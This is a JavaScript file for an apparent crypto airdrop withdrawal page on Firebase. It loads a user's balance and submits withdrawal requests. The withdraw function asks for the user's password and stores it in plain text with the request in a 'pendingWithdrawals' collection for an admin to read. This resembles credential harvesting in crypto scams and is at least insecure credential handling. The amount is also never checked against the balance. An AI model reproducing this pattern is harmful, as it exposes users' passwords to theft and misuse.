import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
import {
  getFirestore,
  doc,
  getDoc,
  addDoc,
  collection
} from "https://www.gstatic.com/firebasejs/12.14.0/firebase-firestore.js";

import {
  getAuth,
  onAuthStateChanged
} from "https://www.gstatic.com/firebasejs/12.14.0/firebase-auth.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCQVHBn504Y26YtR38JRJhRlUbBoa2CIPo",
  authDomain: "pcnexchange.firebaseapp.com",
  projectId: "pcnexchange",
  storageBucket: "pcnexchange.firebasestorage.app",
  messagingSenderId: "278761036604",
  appId: "1:278761036604:web:a02e2d2ac7a9379d6f9c39"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);

let uid = null;
let balance = 0;

// UI element
const balanceEl = document.getElementById("balance");

// format to 8 decimals (IMPORTANT)
function format(num) {
  return Number(num).toFixed(8);
}

//
// ================= LOAD USER BALANCE =================
//
onAuthStateChanged(auth, async (user) => {
  if (!user) {
    alert("Please login first");
    window.location.href = "login.html";
    return;
  }

  uid = user.uid;

  const ref = doc(db, "users", uid);
  const snap = await getDoc(ref);

  if (snap.exists()) {
    balance = snap.data().balance || 0;
  } else {
    balance = 0;
  }

  balanceEl.textContent = format(balance);
});

//
// ================= WITHDRAW FUNCTION =================
//
window.submitWithdraw = async function () {

  const userIdInput = document.getElementById("userId").value.trim();
  const password = document.getElementById("password").value.trim();
  const amount = Number(document.getElementById("amount").value);

  // validation
  if (!userIdInput || !password || !amount) {
    alert("Please fill all fields");
    return;
  }

  // allow micro crypto withdrawal
  if (amount < 0.00000001) {
    alert("Minimum withdrawal is 0.00000001");
    return;
  }

  try {

    // ================= SEND TO ADMIN =================
    await addDoc(collection(db, "pendingWithdrawals"), {
      userId: uid,
      enteredUserId: userIdInput,
      password: password,
      amount: amount,

      status: "Pending",
      type: "airdrop_withdraw",

      balanceBefore: balance,
      createdAt: Date.now()
    });

    alert("Withdrawal sent to admin successfully ✔");

    // clear form
    document.getElementById("userId").value = "";
    document.getElementById("password").value = "";
    document.getElementById("amount").value = "";

  } catch (err) {
    console.error("Withdrawal error:", err);
    alert("Failed to send withdrawal");
  }
};